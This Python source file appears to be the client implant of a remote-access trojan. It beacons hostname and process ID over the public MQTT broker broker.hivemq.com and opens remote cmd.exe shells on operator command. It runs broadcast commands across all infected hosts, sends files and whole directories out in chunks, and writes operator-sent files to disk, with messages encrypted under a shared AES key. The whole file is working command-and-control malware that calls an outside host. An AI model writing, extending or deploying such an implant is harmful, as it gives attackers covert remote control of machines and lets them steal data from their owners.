import socket
import paho.mqtt.client as mqtt
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import hashlib
import base64
import uuid
import json
import threading
import os
import sys
import subprocess
import time

userdomain = os.environ.get("USERDOMAIN")
if not userdomain:
	try:
		userdomain = socket.gethostname()
	except:
		userdomainm = uuid.uuid4().hex

tag = f"{os.getpid()}@{userdomain}"

beacon_left = 30
default_shell = "cmd.exe"
pending_active_sessions = []
sessions = {}
output_buffer = {}
c2t_file_stack = {}
pending_t2c_file_acks = []
t2c_file_status = {}

def exec_path():
	if getattr(sys, "frozen", False):
		application_path = sys.executable
	elif __file__:
		application_path = os.path.abspath(__file__)
	return application_path

OUTPUTDIR = os.path.abspath(os.path.dirname(exec_path()))
os.makedirs(OUTPUTDIR, exist_ok=True)

# AES settings
AES_KEY = b"0000000000000000"  # Replace with a securely shared key

def encrypt_message(message, key):
	iv = get_random_bytes(AES.block_size)  # Generate a unique IV for each message
	cipher = AES.new(key, AES.MODE_CBC, iv)
	encrypted_message = cipher.encrypt(pad(message.encode("utf-8"), AES.block_size))
	return base64.b64encode(iv + encrypted_message).decode("utf-8")

def decrypt_message(encrypted_message, key):
	try:
		decoded_message = base64.b64decode(encrypted_message)
		iv = decoded_message[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		decrypted_message = unpad(cipher.decrypt(decoded_message[AES.block_size:]), AES.block_size)
		return decrypted_message.decode("utf-8")
	except (ValueError, KeyError):
		return None

def handle_shell_output(client, session_id):
	while sessions[session_id].poll() is None:
		try:
			output = sessions[session_id].stdout.read(1)
		except UnicodeDecodeError:
			output = "?"

		if output:
			if not session_id in output_buffer:
				output_buffer[session_id] = ""

			output_buffer[session_id] += output
			"""
			publish_json_message(client, TOPIC, {
				"type": "shell_output",
				"session_id": session_id,
				"output": output
			})
			"""
		else:
			break
	
	try:
		output = sessions[session_id].stdout.read()
	except UnicodeDecodeError:
		output = "?"
	
	output_buffer[session_id] += output

	publish_json_message(client, CMD_TOPIC, {
		"type": "end_session",
		"session_id": session_id
	})

	sessions[session_id].terminate()
	sessions.pop(session_id, 0)

def handle_buffer(client):
	while True:
		for session_id in output_buffer:
			if output_buffer[session_id]:
				l = len(output_buffer[session_id])
				publish_json_message(client, CMD_TOPIC, {
					"type": "shell_output",
					"session_id": session_id,
					"output": output_buffer[session_id]
				})

				output_buffer[session_id] = output_buffer[session_id][l:]
	
		time.sleep(0.1)

def get_file_list(directory, source):
		file_list = {}
		try:
			for root, _, files in os.walk(directory):
				for file in files:
					rel_path = os.path.relpath(os.path.join(root, file), source)
					file_list[rel_path] = os.path.join(root, file)
		except Exception as e:
			print(f"[Error] Unable to read directory {directory}: {e}")
		return file_list

def to_chunks(content, chunksize):
	chunks = {}
	for i, chunk in enumerate((content[i:i+chunksize] for i in range(0, len(content), chunksize)), start=1):
		chunks[i] = base64.b64encode(chunk).decode("utf-8")
	return chunks

def handle_t2c_ack(file_client, session_id, t2c_ack_id, source_path):
	if not os.path.exists(source_path):
		print("Path does not exists.")
		publish_json_message(cmd_client, CMD_TOPIC, {
			"type": "t2c_reject",
			"session_id": session_id,
			"t2c_ack_id": t2c_ack_id,
			"message": "Path does not exists."
		})
		return

	if os.path.isdir(source_path):
		file_paths = get_file_list(source_path, os.path.dirname(source_path))
	else:
		file_paths = {os.path.basename(source_path): source_path}

	publish_json_message(cmd_client, CMD_TOPIC, {
		"type": "t2c_accept",
		"session_id": session_id,
		"t2c_ack_id": t2c_ack_id,
		"len": len(file_paths)
	})

	for i, rel_file_path in enumerate(file_paths):
		file_id = uuid.uuid4().hex
		abs_file_path = file_paths[rel_file_path]

		with open(abs_file_path, "rb") as f:
			file_content = f.read()
		file_hash = hashlib.md5(file_content).hexdigest()
		file_chunks = to_chunks(file_content, 1024 * 512) # 512KB each
		total_chunks = len(file_chunks)

		publish_json_message(cmd_client, CMD_TOPIC, {
			"type": "t2c_transack",
			"t2c_ack_id": t2c_ack_id,
			"file_id": file_id,
			"rel_file_path": rel_file_path,
			"len": total_chunks,
			"md5": file_hash
		})

		pending_t2c_file_acks.append(file_id)

		while file_id in pending_t2c_file_acks:
			time.sleep(0.1)

		t2c_file_status[file_id] = {
			"remainchunk": {i: file_chunks[i] for i in range(1, total_chunks + 1)},
			"last_react": time.time()
		}

		for i in range(1, total_chunks + 1):
			publish_json_message(file_client, FILE_TOPIC, {
				"type": "t2c_trans",
				"t2c_ack_id": t2c_ack_id,
				"file_id": file_id,
				"chunk": i,
				"content": file_chunks[i],
			})

			time.sleep(0.05) # ajust

		t2c_file_status[file_id]["last_react"] = time.time()
								
		while t2c_file_status[file_id]["remainchunk"]:
			time.sleep(0.5)
			if time.time() - t2c_file_status[file_id]["last_react"] >= 10: # resend chunk
				for i, chunk in enumerate(t2c_file_status[file_id]["remainchunk"].copy(), start=1):
					content = t2c_file_status[file_id]["remainchunk"][chunk]
					publish_json_message(file_client, FILE_TOPIC, {
						"type": "t2c_trans",
						"t2c_ack_id": t2c_ack_id,
						"file_id": file_id,
						"chunk": chunk,
						"content": content,
					})
					time.sleep(0.05) # ajust
				t2c_file_status[file_id]["last_react"] = time.time()

# MQTT settings
cmd_client = None
file_client = None
BROKER = "broker.hivemq.com"
PORT = 1883
CMD_TOPIC = "FCTRL/communicate"
FILE_TOPIC = "FCTRL/file"

def on_connect(current_client, userdata, flags, rc):
	"""MQTT connection callback."""
	if rc == 0:
		print("Connected successfully")
		userdata["connected"] = True
		current_client.subscribe(CMD_TOPIC)
	else:
		print(f"Connection failed with code {rc}")

def file_on_connect(current_client, userdata, flags, rc):
	"""MQTT connection callback."""
	if rc == 0:
		print("Connected successfully")
		userdata["connected"] = True
		current_client.subscribe(FILE_TOPIC)
	else:
		print(f"Connection failed with code {rc}")

def on_message(current_client, userdata, msg):
	global cmd_client, file_client, beacon_left
	"""MQTT message callback."""

	decrypted_message = decrypt_message(msg.payload.decode("utf-8"), AES_KEY)
	if decrypted_message:
		try:
			message = json.loads(decrypted_message)

			if message.get("type") == "pingall":
				beacon_left = 200
			elif message.get("type") == "connack" and message.get("target") == tag:
				session_id = uuid.uuid4().hex

				pending_active_sessions.append(session_id)

				publish_json_message(cmd_client, CMD_TOPIC, {
					"type": "confirm_session",
					"ack_id": message.get("ack_id"),
					"session_id": session_id
				})
			elif message.get("type") == "active_session" and message.get("session_id") in pending_active_sessions:
				pending_active_sessions.remove(message.get("session_id"))
				session_id = message.get("session_id")
				sessions[session_id] = subprocess.Popen(default_shell, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
				threading.Thread(target=handle_shell_output, args=(cmd_client, session_id,), daemon=True).start()
			elif message.get("type") == "shell_input":
				session_id = message.get("session_id")
				cmd = message.get("input")
		
				if session_id in sessions:
					sessions[session_id].stdin.write(cmd + "\n")
					sessions[session_id].stdin.flush()
			elif message.get("type") == "boardcast_input":
				boardcast_id = message.get("boardcast_id")
				cmd = message.get("input")

				shell = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
				stdout, stderr = shell.communicate()

				if stderr:
					publish_json_message(cmd_client, CMD_TOPIC, {
						"type": "boardcast_output",
						"boardcast_id": boardcast_id,
						"tag": tag,
						"err": 1,
						"stderr": stderr
					})
				else:
					publish_json_message(cmd_client, CMD_TOPIC, {
						"type": "boardcast_output",
						"boardcast_id": boardcast_id,
						"tag": tag,
						"err": 0,
					})
			elif message.get("type") == "c2t_transack":
				session_id = message.get("session_id")
				file_id = message.get("file_id")

				c2t_file_stack[file_id] = {
					"rel_file_path": message.get("rel_file_path"),
					"md5": message.get("md5"),
					"len": message.get("len"),
					"chunks": {}
				}

				save_path = os.path.join(OUTPUTDIR, c2t_file_stack[file_id]["rel_file_path"])
				os.makedirs(os.path.dirname(save_path), exist_ok=True)
				with open(save_path, "wb") as f:
					f.write(b"")
				
				publish_json_message(cmd_client, CMD_TOPIC, {
					"type": "c2t_transconfirm",
					"session_id": session_id,
					"file_id": file_id,
				})
			elif message.get("type") == "t2c_transconfirm" and message.get("file_id") in pending_t2c_file_acks:
				pending_t2c_file_acks.remove(message.get("file_id"))
			elif message.get("type") == "t2c_recvedchunk" and message.get("file_id") in t2c_file_status:
				file_id = message.get("file_id")
				chunk = message.get("chunk")

				if file_id in t2c_file_status and chunk in t2c_file_status[file_id]["remainchunk"]:
					del t2c_file_status[file_id]["remainchunk"][chunk]
					t2c_file_status[file_id]["last_react"] = time.time()
			elif message.get("type") == "t2c_ack" and message.get("session_id") in sessions:
				session_id = message.get("session_id")
				t2c_ack_id = message.get("t2c_ack_id")
				source_path = message.get("source_path")

				threading.Thread(target=handle_t2c_ack, args=(cmd_client, session_id, t2c_ack_id, source_path), daemon=True).start()
			
		except json.JSONDecodeError:
			print("Invalid JSON format in received message")
		except Exception:
			pass
	else:
		return # new
		print("Failed to decrypt message")

def file_on_message(current_client, userdata, msg):
	global cmd_client, file_client
	"""MQTT message callback."""

	decrypted_message = decrypt_message(msg.payload.decode("utf-8"), AES_KEY)
	if decrypted_message:
		try:
			message = json.loads(decrypted_message)

			if message.get("type") == "c2t_trans":
				file_id = message.get("file_id")
				if file_id in c2t_file_stack:
					chunk = message.get("chunk")
					content = message.get("content")
					c2t_file_stack[file_id]["chunks"][chunk] = content

					publish_json_message(cmd_client, CMD_TOPIC, {
						"type": "c2t_recvedchunk",
						"file_id": file_id,
						"chunk": chunk,
					})
					print("published recved") # new

					if len(c2t_file_stack[file_id]["chunks"]) == c2t_file_stack[file_id]["len"]:
						save_path = os.path.join(OUTPUTDIR, c2t_file_stack[file_id]["rel_file_path"])
						os.makedirs(os.path.dirname(save_path), exist_ok=True)
						with open(save_path, "wb") as f:
							for i in range(1, c2t_file_stack[file_id]["len"] + 1):
								f.write(base64.b64decode(c2t_file_stack[file_id]["chunks"][i].encode()))
						print(f"Saved file to {save_path}")
						del c2t_file_stack[file_id]

		except json.JSONDecodeError:
			print("Invalid JSON format in received message")
		except Exception:
			pass
	else:
		return # new
		print("Failed to decrypt message")

def publish_json_message(client, topic, json_message):
	"""Encrypt and publish a JSON message."""
	message = json.dumps(json_message)
	encrypted_message = encrypt_message(message, AES_KEY)
	client.publish(topic, encrypted_message)

def beacon(client):
	global beacon_left

	while True:
		if beacon_left > 0:
			for i in range(30): # 30s
				try:
					publish_json_message(client, CMD_TOPIC, {
						"type": "beacon", 
						"tag": tag,
					})
				finally:
					time.sleep(0.5)
					beacon_left -= 1

def main():
	global cmd_client, file_client
	print("Connecting to broker")
	
	userdata = {"connected": False}
	cmd_client = mqtt.Client(client_id=uuid.uuid4().hex, userdata=userdata)
	cmd_client.on_connect = on_connect
	cmd_client.on_message = on_message

	while True:
		try:
			cmd_client.connect(BROKER, PORT, 60)
			break
		except Exception as e:
			print(f"Connection error: {e}. Retrying in 3 seconds...")
			time.sleep(3)

	cmd_client.loop_start()

	file_userdata = {"connected": False}
	file_client = mqtt.Client(client_id=uuid.uuid4().hex, userdata=file_userdata)
	file_client.on_connect = file_on_connect
	file_client.on_message = file_on_message

	while True:
		try:
			file_client.connect(BROKER, PORT, 60)
			break
		except Exception as e:
			print(f"Connection error: {e}. Retrying in 3 seconds...")
			time.sleep(3)
	
	file_client.loop_start()

	# Wait for connection
	while not all([userdata["connected"], file_userdata["connected"]]):
		time.sleep(0.1)

	try:
		threading.Thread(target=beacon, args=(cmd_client,), daemon=True).start()
		threading.Thread(target=handle_buffer, args=(cmd_client,), daemon=True).start()
		
		while True:
			time.sleep(0.1)
	except KeyboardInterrupt:
		print("\nExiting...")
	finally:
		cmd_client.loop_stop()
		cmd_client.disconnect()

if __name__ == "__main__":
	main()
